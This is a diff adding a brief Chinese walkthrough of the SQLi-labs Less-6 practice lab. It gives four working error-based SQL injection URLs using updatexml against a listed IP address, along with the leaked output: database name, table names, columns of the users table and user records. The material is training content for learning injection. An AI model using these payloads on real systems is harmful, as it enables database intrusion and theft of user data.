@@ -1,0 +1,11 @@
+首先爆库：http://47.93.12.178:4567/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+得到：XPATH syntax error: '~security~'
+
+爆表：http://47.93.12.178:4567/Less-6/?id=0%22or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or%221
+得到：XPATH syntax error: '~emails,referers,uagents,users~'
+
+爆字段：http://47.93.12.178:4567/Less-6/?id=0%22or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%22users%22)),0x7e),1))or%221--+
+得到：XPATH syntax error: '~id,username,password~'
+
+爆值：http://47.93.12.178:4567/Less-6/?id=0%22%20and%20updatexml(%22a%22,concat(0x7e,(select%20substr((select%20group_concat(id,%22$%22,username)%20from%20users),30,32)),0x7e),%22a%22)%23--+
+得到：XPATH syntax error: '~ecure,5$stupid,6$superman,7$bat'
